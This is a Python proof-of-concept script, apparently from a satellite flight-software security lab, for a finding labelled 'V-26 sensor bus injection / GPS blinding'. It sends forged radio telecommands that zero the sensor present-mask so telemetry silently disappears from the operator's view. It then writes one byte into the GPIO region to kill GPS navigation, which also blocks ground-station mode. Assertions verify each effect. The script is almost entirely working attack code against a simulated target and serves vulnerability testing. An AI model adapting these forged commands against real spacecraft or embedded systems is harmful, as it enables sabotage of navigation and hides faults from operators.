#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-26  Radio -> I2C bridge: the sensor present-mask is writable from the
# bus (silently zeroes telemetry) and the GPS shares the GPIO space the
# memory service can poke -- one MEMCPY byte blinds the navigation.
# SPARTA: CT-0003 / sensor spoofing (I2C bus exposure)
def main(dev, ev):
    def sc08(frames):
        return [t for t in frames if t.apid == 0x08]

    # mask -> 0 via forged SB MID: telemetry fields zeroed, TM dropped
    dev.tc(0x1B, struct.pack(">H", 0x103) + bytes([0x00]), via="radio")
    st = dev.find(dev.tc(0x0C, b"", via="usb"), 0x0C)[0]
    check(not (st.u8(2) & 0x03), "BME/ACC present-flags erased")
    got = sc08(dev.advance(15000))
    ev.log(f"15 s window with mask=0: mission TM frames = {len(got)}")
    check(not got, "sensors invisible to the operator (present-bit gating)")
    dev.tc(0x1B, struct.pack(">H", 0x103) + bytes([0x03]), via="radio")
    got = sc08(dev.advance(15000))
    check(len(got) >= 1, "telemetry returns when mask restored")

    # GPS blinding: single byte write into the GPIO block (shared bus)
    dev.tc(0x1A, b"K" + bytes(31), via="radio")
    dev.tc(0x18, struct.pack("<IIH", fs.SYM_LOG_NAME, fs.ADDR_GPIO, 1),
           via="radio")
    nav = dev.find(dev.tc(0x0E, b"", via="usb"), 0x0E)[0]
    ev.log(f"GET_NAV after GPIO poke: status=0x{nav.u8(1):02X} sats={nav.u8(2)} "
           f"lat={nav.le32s(3)}")
    check(nav.u8(1) & 0x01 == 0 and nav.le32s(3) == 0, "GPS chain dead")
    r = dev.tc(0x11, b"\x01", via="radio")           # GS mode needs GPS
    check(dev.err_text(r) == "GS MODE GPS REQUIRED",
          "GS gate cannot open without navigation (blinding works both ways)")
    dev.powercycle()
    nav = dev.find(dev.tc(0x0E, b"", via="usb"), 0x0E)[0]
    check(nav.u8(1) & 0x08, "GPS back after power cycle (RAM-only effect)")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-26 sensor bus injection / GPS blinding", main))
